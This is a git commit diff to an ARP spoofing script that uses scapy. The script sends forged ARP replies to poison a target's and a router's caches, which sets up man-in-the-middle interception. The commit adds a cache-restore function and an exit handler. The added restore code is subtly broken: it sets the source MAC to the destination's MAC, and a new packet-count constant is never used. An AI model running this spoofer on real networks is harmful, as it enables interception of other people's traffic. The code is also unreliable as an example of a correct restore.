ab7798d2c17a9935c0645926a4459de2adfc5bc3
keraattin <kerem-oruc@outlook.com>
2021-01-05 09:16:02 +0300

    Restore Functiom Added

--- arp_spoofer/arp_spoofer.py
+++ arp_spoofer/arp_spoofer.py
@@ -13,6 +13,7 @@ ROUTER_IP = "10.0.2.1"                            # Router Ip Address
 ROUTER_MAC_ADDR = "11:22:33:44:55:66"             # Router MAC Address
 OPERATION = 2                                     # Arp Response Package
 SLEEP_TIME = 2                                    # Sleep Time
+RESTORE_PKG_COUNT = 3                             # Restore Package Count
 ##############################################################################
 
 
@@ -22,6 +23,16 @@ def spoof_arp(target_ip, target_mac, spoofed_ip):
     package.pdst = target_ip                      # Set Target Ip Address
     package.hwdst = target_mac                    # Set Target MAC Address
     package.psrc = spoofed_ip                     # Set Router Ip Address 
+    scapy.send(package,verbose=False)             # Send the Package
+
+
+def restore_arp(dest_ip,dest_mac,source_ip,source_mac):
+    package = scapy.ARP()                         # ARP Package Generated
+    package.op = OPERATION                        # Set Operation to Response
+    package.pdst = dest_ip                        # Set Dest Ip Address
+    package.hwdst = dest_mac                      # Set Dest MAC Address
+    package.psrc = source_ip                      # Set Source Ip Address 
+    package.hwsrc = dest_mac                      # Set Source MAC Address
     scapy.send(package,verbose=False)             # Send the Package
 
 
@@ -36,6 +47,13 @@ def main():
 
 
 if __name__ == '__main__':
-    while True:
-        main()
-        time.sleep(SLEEP_TIME)
+    try:
+        while True:
+            main()
+            time.sleep(SLEEP_TIME)
+    except KeyboardInterrupt:
+        print("\n[-] Arp Tables Restoring...")
+        restore_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP,ROUTER_MAC_ADDR)
+        restore_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP,TARGET_MAC_ADDR)
+        print("[+] Done!")
+        print("[-] Quiting...")
